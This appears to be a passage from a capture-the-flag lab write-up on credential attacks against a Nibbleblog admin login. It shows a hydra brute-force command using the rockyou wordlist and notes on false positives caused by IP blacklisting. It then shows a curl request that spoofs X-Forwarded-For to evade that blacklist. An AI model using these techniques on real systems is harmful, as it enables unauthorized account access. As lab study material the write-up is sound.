03 Credential Access — Blacklist Bypass
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.96.84 http-post-form \
  "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"
  • First attempt (-t 4) returned a false positive in 3s — Nibbleblog's blacklist kicked in after failed attempts, changing the response body so the F= match string was no longer found
  • Second attempt (-t 1, refined F= string) — still a false positive in 6s, confirming the target got blacklisted again almost immediately
  • Conclusion: hydra brute-force against this login is impractical due to aggressive per-IP blacklisting — needed an alternative approach
$ curl -X POST admin.php -H "X-Forwarded-For: 1.2.3.4" -d "username=admin&password=wrongpass"
  • Blacklist bypass: a spoofed X-Forwarded-For header tricks Nibbleblog's IP-based blacklist tracking — returned the normal "Incorrect username or password." response instead of a blacklist block
